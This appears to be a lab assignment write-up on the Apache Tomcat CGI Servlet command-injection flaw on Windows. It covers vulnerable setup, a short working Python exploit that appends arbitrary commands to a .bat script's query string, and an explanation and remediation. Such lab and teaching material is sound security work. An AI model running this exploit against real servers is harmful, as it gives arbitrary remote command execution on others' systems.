# PS
- Bug Overview: Apache Tomcat has a vulnerability in the CGI Servlet which can be exploited to achieve remote code execution (RCE). This is only exploitable when running on Windows in a non-default configuration in conjunction with batch files.
- Aim: Write a working exploit by which you can achieve RCE on the local VM.
- Install vulnerable service in a VM and ensure to meet the condition so that you can exploit it.
- Run your exploit on the vulnerable service and make a video of it.
- Write a brief report about this bug including your exploit code and link for exploit and Video proof.

# Environment Setup:
1. Install a Java Runtime Environment (JRE) in Windows.
1. Download a vulnerable version of Tomcat (in this case 7.0.93) and extract.
1. Modify the `conf\context.xml` file on line 19, to enable privileged context:

	``` html
	<Context privileged="true">
	```	
1. Modify `conf\web.xml` to enable the CGI Servlet by removing the comments around line 387 as follows and adding the following parameters: 

	``` html

	<servlet><servlet-name>cgi</servlet-name>
	<servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
	<init-param>
	  <param-name>cgiPathPrefix</param-name>
	  <param-value>WEB-INF/cgi</param-value>
	</init-param>
	<init-param>
	  <param-name>executable</param-name>
	  <param-value></param-value>
	</init-param>
	<init-param>
	  <param-name>enableCmdLineArguments</param-name>
	  <param-value>true</param-value>
	</init-param>
	<load-on-startup>5</load-on-startup>
	</servlet>
	```

1.	Enable the CGI servlet by removing comments around this â€“ you also need to change the URL pattern to match the one in the previous step (`cgi`):
	``` html
	<servlet-mapping>
	<servlet-name>cgi</servlet-name>
	<url-pattern>/cgi/*</url-pattern>
	</servlet-mapping>
	```

1.	Create a folder for the CGI files:
 	`mkdir webapps\ROOT\WEB-INF\cgi`
1.	Create any non empty bat file with valid commands.
1.	Run Tomcat via the following command:
	``` bash
        cd bin
	catalina run
        ```
1.	Run the exploit code with url of the `.bat` file in cgi folder on server.
  
# Exploit Code:

```python3

	import requests as re
	base_url = input("Enter url of the .bat cgi script: ")
	while(True):
		command = input("Enter the command: ")
		command = '&echo off'+'&echo.'+'&'+command
		r = re.get(base_url, params=command.replace(" ","+"))
		print(r.text)
```
This code exploits vulnerability in parameter interpolation by passing arguements as query parameters which in turn are passed to the underlying windows command line. In
windows `&` is a special character which acts as command seperator. Neither Apache Tomcat or the Windows JRE perform any kind of input validation for these special characters.
So after this we can literally input any command directly to the command line. For example, if input is `whoami`, the command which is passed to cmdline will be `RCE.bat &echo
off&echo.&whoami`. This is only exploitable when running on Windows in a non-default configuration in conjunction with batch files and
`enableCmdLineArguements` set to true in web.xml file. 

  
# Remediation:
1.	Set `enableCmdLineArguements` to `False`.
1.	If above option is required then add additional parameter `cmdLineArgumentsDecoded` for proper input validation. 

# References:
1.	https://www.codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html
1.	https://docs.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way
